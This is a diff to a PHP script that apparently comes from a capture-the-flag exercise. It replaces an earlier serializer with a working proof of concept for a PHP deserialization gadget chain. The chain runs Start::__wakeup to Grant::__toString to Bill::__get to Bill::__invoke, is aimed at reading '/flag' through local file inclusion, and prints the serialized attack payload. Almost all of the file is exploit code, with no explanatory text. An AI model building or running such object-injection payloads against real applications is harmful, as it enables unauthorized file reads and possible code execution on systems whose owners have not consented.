@@ -1,47 +1,62 @@
 <?php
+class Bill {
 
-class you {
-    private $body;
-    private $pro;
+    public $number='';
+    public $card='';
 
-    public function __construct($props = []) {
-        foreach($props as $k => $v) {
-            $this->$k = $v;
-        }
-    }
-    public function linkReference($p1, $p2) {
-        $this->$p2 = &$this->$p1;
-    }
+    // Helper injected by UnSer Tool for POC generation
+    public function __set_p_o_c($k, $v) { $this->$k = $v; }
+
+}
+class Grant {
+
+    private $phone_number=10086;
+    public $file;
+
+    
+
+    
+
+    // Helper injected by UnSer Tool for POC generation
+    public function __set_p_o_c($k, $v) { $this->$k = $v; }
+
+}
+class Start {
+
+    public $name='cmcc';
+    public $flag='/flag';
+
+    
+
+    
+
+    // Helper injected by UnSer Tool for POC generation
+    public function __set_p_o_c($k, $v) { $this->$k = $v; }
+
 }
 
-// Setting private $body
-// Setting private $pro
-$props = array(
-    'body' => 'test',
-    'pro' => 'test',
-);
-$obj = new you($props);
-echo urlencode(serialize($obj));
 
-// POC Segment 
-class my {
-    public $name;
+echo "Payload for Chain: Start::__wakeup -> Grant::__toString -> Bill::__get -> Bill::__invoke\n";
 
-    public function __construct($props = []) {
-        foreach($props as $k => $v) {
-            $this->$k = $v;
-        }
-    }
-    public function linkReference($p1, $p2) {
-        $this->$p2 = &$this->$p1;
-    }
-}
+// 4. Invoke Object (Bill - Sink)
+$sink_obj = new Bill();
+$sink_obj->__set_p_o_c('number', '/flag'); // LFI Target
 
-// Setting public $name
-$props = array(
-    'name' => 'myname',
-);
-$obj = new my($props);
-echo urlencode(serialize($obj));
+// 3. Get Object (Bill - Calls Invoke)
+$get_obj = new Bill();
+$get_obj->__set_p_o_c('card', $sink_obj); // $function = $this->card -> $sink_obj()
 
+// 2. ToString Object (Grant - Calls Get)
+$ts_obj = new Grant();
+$ts_obj->__set_p_o_c('file', $get_obj); // Accessing prop on this triggers __get in Bill
+// Access pattern: $this->file->fii1lennnaammee
+
+// 1. Entry Object (Start)
+$entry = new Start();
+$entry->__set_p_o_c('name', $ts_obj);
+
+
+// --- Bypass Logic ---
+$data = serialize($entry);
+echo $data;
 ?>
